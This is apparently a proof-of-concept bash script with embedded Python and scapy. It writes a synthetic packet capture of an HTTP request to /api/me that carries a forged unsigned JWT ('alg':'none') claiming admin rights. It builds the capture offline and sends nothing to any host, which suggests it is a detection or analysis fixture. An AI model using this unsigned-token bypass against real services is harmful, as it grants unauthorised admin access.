#!/usr/bin/env bash
set -euo pipefail
OUT="${1:?usage: poc.sh <out.pcap>}"
python3 - "$OUT" <<'PY'
import sys,base64
def b(x): return base64.urlsafe_b64encode(x).decode().rstrip("=")
tok=b(b'{"alg":"none","typ":"JWT"}')+"."+b(b'{"sub":"admin","role":"admin"}')+"."
req=b"GET /api/me HTTP/1.1\r\nHost: app.example\r\nAuthorization: Bearer "+tok.encode()+b"\r\nConnection: close\r\n\r\n"
S="10.0.0.32";D="10.0.0.80"
C=lambda f,s,a,p=b"":__import__('scapy.all',fromlist=['x']).Ether()/__import__('scapy.all',fromlist=['x']).IP(src=S,dst=D)/__import__('scapy.all',fromlist=['x']).TCP(sport=46200,dport=80,flags=f,seq=s,ack=a)/(__import__('scapy.all',fromlist=['x']).Raw(p) if p else b"")
from scapy.all import wrpcap, Ether, IP, TCP, Raw
C=lambda f,s,a,p=b"":Ether()/IP(src=S,dst=D)/TCP(sport=46200,dport=80,flags=f,seq=s,ack=a)/(Raw(p) if p else b"")
V=lambda f,s,a:Ether()/IP(src=D,dst=S)/TCP(sport=80,dport=46200,flags=f,seq=s,ack=a)
pk=[C("S",1000,0),V("SA",2000,1001),C("A",1001,2001),C("PA",1001,2001,req),V("A",2001,1001+len(req))]
t=1_700_000_000.0
for p in pk:p.time=t;t+=0.01
wrpcap(sys.argv[1],pk)
PY
